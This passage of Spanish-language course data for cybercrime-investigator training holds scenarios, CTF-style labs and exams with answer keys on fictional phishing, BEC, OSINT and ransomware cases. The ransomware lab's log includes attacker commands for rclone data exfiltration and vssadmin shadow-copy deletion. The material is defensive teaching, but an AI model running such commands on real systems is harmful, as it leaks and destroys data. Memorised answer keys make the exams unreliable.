                question: 'Una fuente sin historial publica un dato que nadie confirma. Según el código del Almirantazgo, se califica…',
                options: [
                  { id: 'ctif7_o1', text: 'F6: no se puede juzgar todavía.', isCorrect: true, score: 10 },
                  { id: 'ctif7_o2', text: 'A1: confiable y confirmado.', isCorrect: false, score: 0 },
                  { id: 'ctif7_o3', text: 'Se publica como hecho.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. Sin historial ni confirmación, la calificación honesta es F6.'
              },
              {
                question: 'Un informe marcado TLP:GREEN se puede compartir…',
                options: [
                  { id: 'ctif8_o1', text: 'Con la comunidad o el sector, pero no en canales públicos.', isCorrect: true, score: 10 },
                  { id: 'ctif8_o2', text: 'En redes sociales.', isCorrect: false, score: 0 },
                  { id: 'ctif8_o3', text: 'Solo con los presentes en la reunión.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. GREEN es para la comunidad; CLEAR es lo único que se puede publicar.'
              }
            ]
          }
        ]
      }
    ]
  },
  cybercrime_intermedio: {
    title: "Investigador Cibercriminal · Nivel Intermedio",
    description: "De la teoría al caso: triage y preservación, análisis de correos fraudulentos, OSINT, registros de acceso y el rastro del dinero. Laboratorios prácticos y examen con nota mínima del 70%.",
    lastUpdated: "Octubre 2026",
    modules: [
      {
        id: 'cci_intro',
        title: "1. 🗺️ Bienvenida al Nivel Intermedio",
        content: [
          { type: 'text', icon: 'UserSearchIcon', text: "En el Nivel Básico aprendió qué es el cibercrimen y cómo se tipifica. Ahora va a investigar: recibirá casos ficticios inspirados en situaciones reales, analizará evidencias y tomará decisiones como lo haría un investigador." },
          { type: 'text', icon: 'AlarmIcon', text: "Este nivel es más exigente: incluye laboratorios de simulación (sus decisiones suman o restan puntos), retos tipo CTF en los que debe encontrar la respuesta exacta en las evidencias, y un examen final que se aprueba con 70% o más." },
          {
            type: 'interactive',
            title: 'Vocabulario del investigador',
            items: [
              { term: 'Triage', definition: 'Clasificar rápidamente un caso según su urgencia, impacto y posibilidad de recuperar evidencia o dinero.' },
              { term: 'Preservación', definition: 'Asegurar que la evidencia no se pierda ni se altere: capturas fechadas, copias con hash, solicitudes a proveedores para que no borren datos.' },
              { term: 'Artefacto', definition: 'Cualquier rastro digital útil: un encabezado de correo, un registro de acceso, una transacción, un dominio.' },
              { term: 'Pivoteo', definition: 'Usar un dato conocido (un dominio, un correo, una IP) para descubrir otros relacionados con el mismo autor o campaña.' },
              { term: 'Bandera (flag)', definition: 'En los retos tipo CTF, la respuesta exacta que se obtiene al analizar correctamente la evidencia.' },
            ]
          },
        ]
      },
      {
        id: 'cci_triage',
        title: "2. Del Reporte al Caso: Triage y Preservación",
        content: [
          { type: 'text', icon: 'AlarmIcon', text: "Las primeras horas son las más valiosas: los delincuentes mueven el dinero en minutos, los proveedores rotan sus registros y las víctimas, por miedo o vergüenza, borran mensajes. Un buen triage decide qué preservar primero." },
          { type: 'text', icon: 'LockIcon', text: "Regla de oro: no contaminar la evidencia. No se reenvía el correo sospechoso (se pierden los encabezados originales), no se responde al delincuente, no se borra nada y se documenta todo con fecha, hora y fuente." },
          {
            type: 'scenario',
            title: 'Caso 1: la llamada del "banco"',
            intro: "Usted atiende a Laura, asociada de una cooperativa ficticia. Hace 40 minutos recibió un SMS \"del banco\" con un enlace, ingresó sus datos y luego una persona la llamó para \"cancelar una compra\" pidiéndole un código. Ahora ve dos transferencias que no hizo. Sus decisiones suman puntos; necesita 60 de 80 para aprobar.",
            start: 's1',
            maxPoints: 80,
            passPoints: 60,
            steps: {
              s1: {
                text: "Laura está alterada y le muestra su celular. ¿Qué hace primero?",
                choices: [
                  { text: "Le pide que llame de inmediato a la línea oficial de su entidad para bloquear productos y reportar las transferencias.", next: 's2', points: 20, feedback: "Correcto. El dinero se mueve rápido: bloquear y reportar a la entidad es lo más urgente, porque puede intentar retener los fondos." },
                  { text: "Le pide que reenvíe el SMS y los pantallazos a su correo para analizarlos con calma.", next: 's2', points: 0, feedback: "Analizar es importante, pero no es lo primero. Cada minuto cuenta para intentar retener el dinero." },
                  { text: "Le dice que borre el SMS para que no vuelva a caer en el engaño.", next: 's2', points: -10, feedback: "Error: borrar el SMS destruye evidencia clave (remitente, enlace, hora)." },
                ]
              },
              s2: {
                text: "La entidad ya bloqueó los productos. Ahora hay que preservar la evidencia del celular. ¿Qué hace?",
                evidence: "SMS recibido 09:12 · Remitente: 891234\n\"BancoAndino: su cuenta presenta un bloqueo. Actualice sus datos en https://bancoandino-seguro.example/validar\"\nLlamada entrante 09:31 · +57 300 000 0000 · duración 6 min",
                choices: [
                  { text: "Toma capturas completas del SMS y del registro de llamadas donde se vean fecha, hora, remitente y el enlace, y anota todo en un acta.", next: 's3', points: 20, feedback: "Bien. Capturas completas y fechadas, más un acta, conservan el contexto que se necesita después." },
                  { text: "Abre el enlace en el celular de Laura para ver qué contiene la página.", next: 's3', points: -10, feedback: "No. Abrir el enlace en el equipo de la víctima puede infectarlo o alertar al delincuente. Se analiza después, en un entorno controlado." },
                  { text: "Copia solo el texto del SMS en un documento de Word.", next: 's3', points: 5, feedback: "Insuficiente: sin fecha, hora y remitente visibles, el texto suelto pierde valor probatorio." },
                ]
              },
              s3: {
                text: "El enlace apunta a un dominio falso. ¿Qué paso sigue para que la evidencia en línea no desaparezca?",
                choices: [
                  { text: "Documentar la URL y solicitar, por los canales formales, la preservación de los datos al proveedor del dominio y del alojamiento, y orientar a Laura para denunciar ante la Fiscalía o el CAI Virtual.", next: 's4', points: 20, feedback: "Correcto. Preservación formal y denuncia: así la evidencia podrá obtenerse luego con orden judicial." },
                  { text: "Intentar ingresar al panel del sitio falso para descubrir quién lo administra.", next: 's4', points: -20, feedback: "Grave: eso sería acceso abusivo a un sistema informático (Art. 269A) y anularía la prueba." },
                  { text: "Publicar la URL en redes sociales para alertar a otros asociados.", next: 's4', points: 5, feedback: "Alertar es útil, pero sin coordinarlo puede hacer que el delincuente borre todo. Primero se preserva, luego se comunica de forma coordinada." },
                ]
              },
              s4: {
                text: "Para cerrar la atención inicial, ¿qué le recomienda a Laura?",
                choices: [
                  { text: "Cambiar contraseñas desde un equipo seguro, activar la verificación en dos pasos y desconfiar de llamadas que piden códigos: ninguna entidad los solicita.", next: 'fin', points: 20, feedback: "Excelente cierre: se reduce el riesgo de que vuelva a ocurrir." },
                  { text: "Que no se preocupe porque el banco siempre devuelve el dinero.", next: 'fin', points: -10, feedback: "No es cierto en todos los casos, y crea expectativas falsas." },
                ]
              },
              fin: { text: "Fin del caso. Revise su puntaje y la retroalimentación de cada decisión." },
            }
          },
        ]
      },
      {
        id: 'cci_email',
        title: "3. 🚩 Laboratorio: Análisis de un Correo Fraudulento",
        content: [
          { type: 'text', icon: 'ClosedEnvelopeIcon', text: "Los encabezados de un correo cuentan su viaje. Las líneas \"Received\" se leen de abajo hacia arriba: la última es el primer servidor que tocó el mensaje. \"Reply-To\" revela a dónde llegarían las respuestas, y \"Authentication-Results\" muestra si pasó los controles SPF, DKIM y DMARC." },
          { type: 'text', icon: 'ShieldCheckIcon', text: "SPF verifica que el servidor que envía esté autorizado por el dominio; DKIM, que el mensaje esté firmado por el dominio; DMARC, que el dominio visible en \"From\" coincida con los que pasaron SPF o DKIM. Un \"fail\" en DMARC es una alerta fuerte de suplantación." },
          {
            type: 'challenge',
            title: 'El correo "urgente" del gerente',
            brief: "Tesorería de una cooperativa ficticia recibió este correo pidiendo un pago urgente. Analice los encabezados y responda. Todos los datos son ficticios.",
            artifacts: [
              {
                name: 'encabezados.eml',
                content: `Return-Path: <notificaciones@pagos-rapidos.example>
Received: from mx1.coopandina.example (mx1.coopandina.example [198.51.100.10])
        by buzon.coopandina.example; Tue, 14 Oct 2026 08:47:12 -0500
Received: from mail.pagos-rapidos.example (unknown [203.0.113.45])
        by mx1.coopandina.example; Tue, 14 Oct 2026 08:47:10 -0500
Authentication-Results: mx1.coopandina.example;
        spf=fail (203.0.113.45 is not permitted) smtp.mailfrom=pagos-rapidos.example;
        dkim=none;
        dmarc=fail (p=reject) header.from=coopandina.example
From: "Carlos Rueda - Gerente" <gerencia@coopandina.example>
Reply-To: <carlos.rueda.gerencia@correo-seguro.example>
To: tesoreria@coopandina.example
Subject: URGENTE - pago a proveedor hoy antes de las 11
Message-ID: <20261014134710.5521@pagos-rapidos.example>
Date: Tue, 14 Oct 2026 08:47:05 -0500`,
              },
            ],
            questions: [
              { prompt: '¿Cuál es la dirección IP del servidor que originó el mensaje (el primer "Received", de abajo hacia arriba)?', answers: ['203.0.113.45'], hint: 'Lea las líneas Received de abajo hacia arriba: la de más abajo es el origen.', explanation: '203.0.113.45 es el servidor de pagos-rapidos.example que entregó el correo a la cooperativa.' },
              { prompt: '¿A qué dirección llegarían las respuestas de Tesorería?', answers: ['carlos.rueda.gerencia@correo-seguro.example'], hint: 'Busque el encabezado Reply-To.', explanation: 'El Reply-To desvía las respuestas a un buzón externo que no es de la cooperativa: táctica clásica de fraude BEC.' },
              { prompt: '¿Qué resultado obtuvo el control DMARC? (una palabra)', answers: ['fail'], explanation: 'DMARC = fail: el dominio visible (coopandina.example) no está respaldado por SPF ni por DKIM. Es suplantación.' },
              { prompt: '¿Qué dominio aparece realmente como remitente técnico en el Return-Path?', answers: ['pagos-rapidos.example'], explanation: 'El Return-Path (y el Message-ID) delatan a pagos-rapidos.example, aunque el "From" muestre el dominio de la cooperativa.' },
            ],
          },
        ]
      },
      {
        id: 'cci_osint',
        title: "4. 🚩 OSINT Aplicado a la Investigación",
        content: [
          { type: 'text', icon: 'UserSearchIcon', text: "La inteligencia de fuentes abiertas (OSINT) usa información pública: registros de dominios (WHOIS/RDAP), DNS, registros de transparencia de certificados (Certificate Transparency), archivos históricos de páginas web y perfiles públicos." },
          { type: 'text', icon: 'LockIcon', text: "Límites: OSINT es consultar lo que ya es público. Engañar a alguien para obtener datos, entrar a cuentas ajenas o comprar bases de datos filtradas puede ser delito (Ley 1273 de 2009) o vulnerar la protección de datos (Ley 1581 de 2012). Toda consulta se documenta: qué, cuándo y desde dónde." },
          {
            type: 'challenge',
            title: 'Pivoteo sobre el dominio del fraude',
            brief: "El dominio pagos-rapidos.example apareció en el correo del laboratorio anterior. Analice su registro RDAP y los certificados emitidos para responder. Todo es ficticio.",
            artifacts: [
              {
                name: 'rdap_pagos-rapidos.json',
                content: `{
  "ldhName": "pagos-rapidos.example",
  "events": [
    { "eventAction": "registration", "eventDate": "2026-10-10T22:14:05Z" },
    { "eventAction": "expiration",   "eventDate": "2027-10-10T22:14:05Z" }
  ],
  "entities": [
    { "roles": ["registrar"], "vcardArray": ["vcard", [["fn", {}, "text", "Registrador Ejemplo S.A."]]] },
    { "roles": ["registrant"], "remarks": [{ "description": ["REDACTED FOR PRIVACY"] }] }
  ],
  "nameservers": [ { "ldhName": "ns1.hosting-barato.example" }, { "ldhName": "ns2.hosting-barato.example" } ]
}`,
              },
              {
                name: 'certificados_CT.txt',
                content: `Consulta de Certificate Transparency para "%.pagos-rapidos.example" y dominios relacionados
emitido             nombre(s) en el certificado
2026-10-11 03:02    pagos-rapidos.example, www.pagos-rapidos.example
2026-10-11 03:05    portal.bancoandino-seguro.example
2026-10-12 17:40    coopandina-pagos.example, www.coopandina-pagos.example
(Los tres certificados fueron solicitados desde la misma cuenta de hosting: hosting-barato.example)`,
              },
            ],
            questions: [
              { prompt: '¿En qué fecha se registró el dominio pagos-rapidos.example? (formato AAAA-MM-DD)', answers: ['2026-10-10'], hint: 'Busque el evento "registration".', explanation: 'Registrado el 2026-10-10, cuatro días antes del correo fraudulento: un dominio "recién nacido" es una alerta típica.' },
              { prompt: '¿Qué otro dominio, que imita a la cooperativa, aparece en los certificados emitidos?', answers: ['coopandina-pagos.example', 'www.coopandina-pagos.example'], explanation: 'coopandina-pagos.example imita a la cooperativa. Pivotear sobre la infraestructura reveló otra pieza de la misma campaña.' },
              { prompt: '¿Qué proveedor de hosting conecta los dominios de la campaña?', answers: ['hosting-barato.example'], explanation: 'Los servidores de nombres y la cuenta de hosting en común conectan los dominios: es un punto de pivoteo y un destinatario para solicitar preservación de datos.' },
            ],
          },
        ]
      },
      {
        id: 'cci_logs',
        title: "5. 🚩 Laboratorio: Rastros en los Registros de Acceso",
        content: [
          { type: 'text', icon: 'ServerIcon', text: "Cuando una cuenta de correo es comprometida, los registros de inicio de sesión muestran el patrón: accesos desde ubicaciones imposibles para la misma persona (viaje imposible), nuevos dispositivos, y cambios silenciosos como reglas de reenvío que copian el correo hacia afuera." },
          {
            type: 'challenge',
            title: 'La cuenta de tesorería comprometida',
            brief: "Días después del fraude, la cooperativa ficticia revisa los registros de la cuenta tesoreria@coopandina.example. Encuentre los indicadores del compromiso.",
            artifacts: [
              {
                name: 'inicios_de_sesion.log',
                content: `fecha_hora (UTC-5)     usuario                        ip              ubicación         resultado   dispositivo
2026-10-13 07:58:02    tesoreria@coopandina.example   198.51.100.23   Medellín, CO      éxito       Windows / Edge
2026-10-13 12:10:44    tesoreria@coopandina.example   198.51.100.23   Medellín, CO      éxito       Windows / Edge
2026-10-13 12:41:19    tesoreria@coopandina.example   192.0.2.77      Lagos, NG         fallo       Linux / Firefox
2026-10-13 12:41:52    tesoreria@coopandina.example   192.0.2.77      Lagos, NG         éxito       Linux / Firefox
2026-10-13 12:44:05    tesoreria@coopandina.example   198.51.100.23   Medellín, CO      éxito       Windows / Edge`,
              },
              {
                name: 'auditoria_buzon.log',
                content: `2026-10-13 12:43:10  usuario=tesoreria@coopandina.example  ip=192.0.2.77
  accion=New-InboxRule  nombre="."  condición=cualquier mensaje
  acciones: ForwardTo=archivo.tesoreria@correo-seguro.example ; MarkAsRead=true ; MoveToFolder="RSS"`,
              },
            ],
            questions: [
              { prompt: '¿Desde qué IP se accedió de forma sospechosa a la cuenta?', answers: ['192.0.2.77'], explanation: '192.0.2.77, ubicada en otro continente 31 minutos después de un acceso en Medellín: viaje imposible.' },
              { prompt: '¿A qué dirección externa reenvía los mensajes la regla creada por el atacante?', answers: ['archivo.tesoreria@correo-seguro.example'], explanation: 'El atacante creó una regla que reenvía todo a un buzón externo del mismo dominio que vimos en el Reply-To del laboratorio 3.' },
              { prompt: '¿Cómo se llama la regla de buzón creada? (escriba el nombre exacto)', answers: ['.'], hint: 'Es un nombre muy corto, pensado para pasar desapercibido.', explanation: 'Un nombre como "." y mover los correos a una carpeta poco revisada ("RSS") son tácticas para ocultar la regla a la víctima.' },
            ],
          },
          {
            type: 'quiz',
            quizData: {
              question: "Además de cambiar la contraseña de la cuenta comprometida, ¿qué es indispensable hacer?",
              options: [
                "Nada más: con la nueva contraseña el atacante pierde el acceso a todo.",
                "Eliminar la regla de reenvío maliciosa, cerrar las sesiones activas y activar la verificación en dos pasos.",
                "Borrar el registro de auditoría para empezar de cero."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. La regla seguiría filtrando correos aunque cambie la contraseña. Y el registro de auditoría es evidencia: nunca se borra.",
                incorrect: "No. La regla de reenvío sigue funcionando aunque cambie la contraseña, y borrar registros destruye evidencia."
              }
            }
          },
        ]
      },
      {
        id: 'cci_money',
        title: "6. El Rastro del Dinero",
        content: [
          { type: 'text', icon: 'BrokenEnvelopeIcon', text: "El dinero robado rara vez va directo al delincuente: pasa por cuentas de \"mulas\" (personas que prestan o venden sus cuentas, a veces engañadas), se divide en montos pequeños, se retira en efectivo o se convierte en criptoactivos en cuestión de horas." },
          { type: 'text', icon: 'ShieldCheckIcon', text: "Por eso la coordinación entre la víctima, su entidad financiera y las entidades receptoras es urgente. Los datos de las cuentas destino y sus titulares solo se obtienen formalmente, por orden de la Fiscalía; pero la alerta temprana entre entidades puede congelar fondos antes de que salgan." },
          {
            type: 'scenario',
            title: 'Caso 2: siguiendo los 18 millones',
            intro: "La cooperativa ficticia pagó $18.000.000 a la cuenta indicada en el correo fraudulento. Usted coordina la respuesta. Necesita 50 de 60 puntos para aprobar.",
            start: 'm1',
            maxPoints: 60,
            passPoints: 50,
            steps: {
              m1: {
                text: "Se detectó el fraude 3 horas después del pago. ¿Cuál es la acción más urgente?",
                choices: [
                  { text: "Que la cooperativa contacte de inmediato a su entidad financiera para solicitar la retención o reversión del pago y la alerta a la entidad receptora.", next: 'm2', points: 20, feedback: "Correcto: cada hora reduce la probabilidad de recuperar los fondos." },
                  { text: "Esperar a tener el informe técnico completo antes de avisar al banco.", next: 'm2', points: -10, feedback: "Demasiado tarde: el informe puede tomar días; los fondos salen en horas." },
                ]
              },
              m2: {
                text: "La entidad receptora informa que la cuenta recibió otras 9 transferencias similares esta semana y que el titular es un joven de 19 años sin antecedentes. ¿Qué hipótesis es más razonable?",
                choices: [
                  { text: "Probablemente es una cuenta de mula, posiblemente reclutada con una falsa oferta de empleo; el titular puede ser una pieza menor y también una víctima de la red.", next: 'm3', points: 20, feedback: "Bien razonado. Las mulas son un eslabón de la red; identificarlas ayuda a llegar a quienes las reclutan." },
                  { text: "Él es el cerebro de la estafa: hay que publicar su nombre.", next: 'm3', points: -10, feedback: "Conclusión apresurada y riesgosa: exponer datos personales sin proceso vulnera derechos y puede afectar la investigación." },
                ]
              },
              m3: {
                text: "Parte del dinero salió hacia una plataforma de criptoactivos. ¿Qué sabe sobre esa ruta?",
                choices: [
                  { text: "Las cadenas de bloques públicas dejan un registro permanente y los exchanges regulados aplican conocimiento del cliente (KYC): por vía judicial se puede solicitar información y, a veces, congelar fondos.", next: 'fin', points: 20, feedback: "Correcto. Los criptoactivos no son anónimos por definición: son seudónimos y trazables." },
                  { text: "Con criptoactivos ya no hay nada que hacer: son completamente anónimos.", next: 'fin', points: 0, feedback: "Mito frecuente. La trazabilidad es posible; lo veremos a fondo en el Nivel Avanzado." },
                ]
              },
              fin: { text: "Fin del caso. Revise su puntaje y la retroalimentación." },
            }
          },
        ]
      },
      {
        id: 'cci_exam',
        title: "7. 📝 Examen del Nivel Intermedio",
        content: [
          { type: 'text', icon: 'CheckCircleIcon', text: "Llegó el momento de demostrar lo aprendido. El examen toma 10 preguntas al azar de un banco de 14 y se aprueba con 70%. Si no aprueba, puede reintentar con otras preguntas. Al aprobarlo obtendrá el badge de Investigador Cibercriminal · Nivel Intermedio y se desbloqueará el Nivel Avanzado." },
          {
            type: 'exam',
            title: 'Examen: Investigador Cibercriminal · Intermedio',
            description: 'Evalúa triage, preservación, análisis de encabezados, OSINT, registros de acceso y rastro del dinero.',
            passPercent: 70,
            questionsPerAttempt: 10,
            questions: [
              { question: 'Una víctima de fraude bancario acaba de ver transferencias no autorizadas. ¿Qué es lo primero?', options: [{ id: 'e1a', text: 'Contactar a su entidad por la línea oficial para bloquear productos y reportar las transferencias.', isCorrect: true, score: 10 }, { id: 'e1b', text: 'Escribirle al número que la llamó para exigir la devolución.', isCorrect: false, score: 0 }, { id: 'e1c', text: 'Esperar al día siguiente para ver si el dinero regresa solo.', isCorrect: false, score: 0 }], feedback: 'El tiempo es crítico para intentar retener los fondos.' },
              { question: '¿Por qué no se debe reenviar un correo sospechoso como evidencia?', options: [{ id: 'e2a', text: 'Porque al reenviarlo se pierden o alteran los encabezados originales.', isCorrect: true, score: 10 }, { id: 'e2b', text: 'Porque reenviar correos es ilegal.', isCorrect: false, score: 0 }, { id: 'e2c', text: 'Porque ocupa espacio en el buzón.', isCorrect: false, score: 0 }], feedback: 'Se exporta el original (.eml) o se copian los encabezados completos.' },
              { question: 'Las líneas "Received" de un correo se leen…', options: [{ id: 'e3a', text: 'De abajo hacia arriba: la última es el primer servidor.', isCorrect: true, score: 10 }, { id: 'e3b', text: 'De arriba hacia abajo: la primera es el origen.', isCorrect: false, score: 0 }, { id: 'e3c', text: 'En cualquier orden: todas dicen lo mismo.', isCorrect: false, score: 0 }], feedback: 'Cada servidor agrega su línea arriba de las anteriores.' },
              { question: 'Un correo muestra "dmarc=fail" para el dominio del From. ¿Qué indica?', options: [{ id: 'e4a', text: 'Que el dominio visible no está respaldado por SPF ni DKIM: posible suplantación.', isCorrect: true, score: 10 }, { id: 'e4b', text: 'Que el correo tiene un archivo adjunto.', isCorrect: false, score: 0 }, { id: 'e4c', text: 'Que el buzón del destinatario está lleno.', isCorrect: false, score: 0 }], feedback: 'DMARC verifica la alineación del dominio del From.' },
              { question: 'El encabezado "Reply-To" apunta a un dominio distinto al del remitente. ¿Por qué es relevante en un fraude BEC?', options: [{ id: 'e5a', text: 'Porque las respuestas de la víctima llegarían al delincuente, no al remitente legítimo.', isCorrect: true, score: 10 }, { id: 'e5b', text: 'No es relevante: siempre es así.', isCorrect: false, score: 0 }, { id: 'e5c', text: 'Porque indica que el correo está cifrado.', isCorrect: false, score: 0 }], feedback: 'El Reply-To desviado es una de las señales más claras de BEC.' },
              { question: '¿Cuál de estas acciones es OSINT legítimo?', options: [{ id: 'e6a', text: 'Consultar el registro RDAP de un dominio y los certificados públicos emitidos.', isCorrect: true, score: 10 }, { id: 'e6b', text: 'Adivinar la contraseña de la cuenta del sospechoso.', isCorrect: false, score: 0 }, { id: 'e6c', text: 'Comprar una base de datos filtrada con datos del sospechoso.', isCorrect: false, score: 0 }], feedback: 'OSINT es consultar información pública, sin engaño ni acceso indebido.' },
              { question: 'Un dominio usado en un fraude fue registrado 4 días antes del ataque. ¿Qué valor tiene ese dato?', options: [{ id: 'e7a', text: 'Es una alerta típica: los dominios de fraude suelen ser recién registrados.', isCorrect: true, score: 10 }, { id: 'e7b', text: 'Ninguno: la fecha de registro no importa.', isCorrect: false, score: 0 }, { id: 'e7c', text: 'Prueba quién es el autor del fraude.', isCorrect: false, score: 0 }], feedback: 'Es un indicio, no una prueba de autoría.' },
              { question: '¿Qué permite descubrir la búsqueda en Certificate Transparency?', options: [{ id: 'e8a', text: 'Certificados emitidos para un dominio y sus subdominios, que pueden revelar otros sitios de la misma campaña.', isCorrect: true, score: 10 }, { id: 'e8b', text: 'Las contraseñas de los usuarios del sitio.', isCorrect: false, score: 0 }, { id: 'e8c', text: 'El contenido de los correos enviados por el dominio.', isCorrect: false, score: 0 }], feedback: 'Los registros CT son públicos y útiles para pivotear.' },
              { question: 'Una cuenta inicia sesión en Medellín y 30 minutos después en otro continente. ¿Cómo se llama ese patrón?', options: [{ id: 'e9a', text: 'Viaje imposible.', isCorrect: true, score: 10 }, { id: 'e9b', text: 'Movimiento lateral.', isCorrect: false, score: 0 }, { id: 'e9c', text: 'Denegación de servicio.', isCorrect: false, score: 0 }], feedback: 'Es uno de los indicadores más usados para detectar cuentas comprometidas.' },
              { question: 'Tras recuperar una cuenta de correo comprometida, ¿qué suele olvidarse revisar?', options: [{ id: 'e10a', text: 'Las reglas de reenvío y las sesiones activas creadas por el atacante.', isCorrect: true, score: 10 }, { id: 'e10b', text: 'El tamaño de la bandeja de entrada.', isCorrect: false, score: 0 }, { id: 'e10c', text: 'La firma del correo.', isCorrect: false, score: 0 }], feedback: 'La regla sigue filtrando información aunque se cambie la contraseña.' },
              { question: '¿Qué es una "mula" en un fraude financiero?', options: [{ id: 'e11a', text: 'Una persona cuya cuenta se usa para recibir y mover dinero robado, a veces engañada.', isCorrect: true, score: 10 }, { id: 'e11b', text: 'Un tipo de malware bancario.', isCorrect: false, score: 0 }, { id: 'e11c', text: 'El servidor donde se aloja la página falsa.', isCorrect: false, score: 0 }], feedback: 'Las mulas son un eslabón clave para "enfriar" el dinero.' },
              { question: '¿Cómo se obtienen legalmente los datos del titular de una cuenta que recibió dinero robado?', options: [{ id: 'e12a', text: 'Mediante solicitud formal dentro de la investigación, con orden de la autoridad competente.', isCorrect: true, score: 10 }, { id: 'e12b', text: 'Pidiéndoselos por teléfono a un empleado del banco conocido.', isCorrect: false, score: 0 }, { id: 'e12c', text: 'Buscándolos en foros donde se venden datos.', isCorrect: false, score: 0 }], feedback: 'Los datos financieros están protegidos; se obtienen por vía judicial.' },
              { question: '¿Son anónimos los criptoactivos en una cadena de bloques pública?', options: [{ id: 'e13a', text: 'No: son seudónimos; las transacciones quedan registradas y pueden rastrearse.', isCorrect: true, score: 10 }, { id: 'e13b', text: 'Sí: es imposible seguir el dinero.', isCorrect: false, score: 0 }, { id: 'e13c', text: 'Solo si se usan de noche.', isCorrect: false, score: 0 }], feedback: 'El registro público permite la trazabilidad.' },
              { question: 'Durante una investigación, ¿por qué se documenta cada consulta OSINT con fecha, hora y fuente?', options: [{ id: 'e14a', text: 'Para que el hallazgo sea verificable y reproducible si se presenta como prueba.', isCorrect: true, score: 10 }, { id: 'e14b', text: 'Por costumbre, no tiene utilidad.', isCorrect: false, score: 0 }, { id: 'e14c', text: 'Para cobrar por horas.', isCorrect: false, score: 0 }], feedback: 'La información en línea cambia; el registro demuestra qué se vio y cuándo.' },
            ],
          },
        ]
      },
    ]
  },
  cybercrime_avanzado: {
    title: "Investigador Cibercriminal · Nivel Avanzado",
    description: "Del investigador al perito: reconstrucción de un ransomware, trazabilidad de criptoactivos, atribución, prueba digital y cooperación internacional, informe pericial y un caso integrador. Examen con nota mínima del 80%.",
    lastUpdated: "Octubre 2026",
    modules: [
      {
        id: 'cca_intro',
        title: "1. 🎯 Nivel Avanzado: del Investigador al Perito",
        content: [
          { type: 'text', icon: 'UserSearchIcon', text: "En este nivel, sus hallazgos deben resistir el escrutinio de una audiencia: no basta con saber qué pasó, hay que demostrarlo con evidencia íntegra, una metodología reproducible y conclusiones con el nivel de confianza adecuado." },
          { type: 'text', icon: 'AlarmIcon', text: "Los laboratorios son más largos y las decisiones más finas. El examen final toma 12 preguntas al azar de un banco de 16 y exige 80%. Al aprobarlo obtendrá el badge de Investigador Cibercriminal · Nivel Avanzado y completará el mapa de expertise." },
        ]
      },
      {
        id: 'cca_ransomware',
        title: "2. 🚩 Laboratorio: Reconstrucción de un Ataque de Ransomware",
        content: [
          { type: 'text', icon: 'BugIcon', text: "El ransomware moderno opera como servicio (Ransomware-as-a-Service): los desarrolladores alquilan el malware a afiliados que entran a la red, roban datos y luego cifran (doble extorsión). Antes de cifrar, suelen crear cuentas, escalar privilegios, desactivar respaldos y borrar registros." },
          { type: 'text', icon: 'ServerIcon', text: "Eventos de Windows útiles: 4625 (inicio de sesión fallido), 4624 (inicio de sesión exitoso; el tipo 10 es escritorio remoto), 4720 (cuenta creada), 4732 (miembro agregado a un grupo local, por ejemplo Administradores), 4688 (proceso creado), 7045 (servicio instalado) y 1102 (registro de auditoría borrado)." },
          {
            type: 'challenge',
            title: 'Línea de tiempo del servidor SRV-CORE01',
            brief: "Una cooperativa ficticia amaneció con sus archivos cifrados. Estos son los eventos extraídos del servidor antes de que se borraran los registros. Reconstruya el ataque.",
            artifacts: [
              {
                name: 'eventos_SRV-CORE01.csv',
                content: `fecha_hora (UTC-5)   id_evento  detalle
2026-10-17 01:02:11  4625       Inicio fallido · cuenta=admin · origen=203.0.113.88 · tipo=10
2026-10-17 01:02:13  4625       Inicio fallido · cuenta=administrador · origen=203.0.113.88 · tipo=10
2026-10-17 01:03:40  4625       Inicio fallido · cuenta=soporte · origen=203.0.113.88 · tipo=10
2026-10-17 01:04:02  4624       Inicio exitoso · cuenta=soporte · origen=203.0.113.88 · tipo=10
2026-10-17 01:09:55  4720       Cuenta creada · nueva=svc_backup2 · por=soporte
2026-10-17 01:10:21  4732       Agregado a grupo · cuenta=svc_backup2 · grupo=Administradores
2026-10-17 02:15:37  4688       Proceso · rclone.exe copy D:\\Asociados remoto:bkp --transfers 8
2026-10-17 03:30:02  4688       Proceso · vssadmin.exe delete shadows /all /quiet
2026-10-17 03:31:10  7045       Servicio instalado · nombre=WinUpdSvc · ruta=C:\\ProgramData\\wus.exe
2026-10-17 03:33:48  1102       Registro de auditoría borrado · por=svc_backup2`,
              },
            ],
            questions: [
              { prompt: '¿Con qué cuenta logró entrar el atacante?', answers: ['soporte'], explanation: 'Tras varios intentos fallidos por escritorio remoto (tipo 10), entró con la cuenta "soporte": contraseña débil y RDP expuesto a internet.' },
              { prompt: '¿Qué cuenta creó para mantener el acceso con privilegios?', answers: ['svc_backup2'], explanation: 'Creó svc_backup2 (evento 4720) y la agregó a Administradores (4732). El nombre imita una cuenta de servicio legítima para pasar desapercibida.' },
              { prompt: '¿Qué herramienta usó para exfiltrar los datos de asociados? (nombre del ejecutable)', answers: ['rclone.exe', 'rclone'], explanation: 'rclone es una herramienta legítima de sincronización que los atacantes usan para copiar datos a la nube antes de cifrar: la base de la doble extorsión.' },
              { prompt: '¿Qué ID de evento revela que se borraron los registros de auditoría?', answers: ['1102'], explanation: 'El 1102 marca el borrado del registro de seguridad. Por eso importa enviar los registros a un sistema central: lo que queda en el servidor puede desaparecer.' },
              { prompt: '¿Qué comando eliminó las copias de seguridad locales (instantáneas)? Escriba el ejecutable.', answers: ['vssadmin.exe', 'vssadmin'], explanation: '"vssadmin delete shadows" borra las instantáneas de volumen para impedir la recuperación sin pagar.' },
            ],
          },
        ]
      },
      {
        id: 'cca_crypto',
        title: "3. 🚩 Trazabilidad de Criptoactivos",
        content: [
          { type: 'text', icon: 'BrainCircuitIcon', text: "En redes como Bitcoin, el análisis usa heurísticas. La de propiedad común de entradas: cuando una transacción gasta varias direcciones a la vez, probablemente todas son del mismo dueño. La de cambio: el sobrante vuelve a una dirección nueva del mismo dueño." },
          { type: 'text', icon: 'ShieldCheckIcon', text: "El punto de control suele estar en los exchanges regulados, que aplican conocimiento del cliente (KYC) y pueden entregar información o congelar fondos por orden judicial. Los mezcladores (mixers) y los puentes entre cadenas buscan romper el rastro, pero dejan patrones." },
          {
            type: 'challenge',
            title: 'El rescate pagado',
            brief: "La cooperativa del laboratorio anterior no pagó, pero otra víctima ficticia sí. Siga el pago del rescate. Todas las direcciones son ficticias.",
            artifacts: [
              {
                name: 'transacciones.txt',
                content: `TX-01  entradas: [VICTIMA-1]                       salidas: RESCATE-A (0.50 BTC)
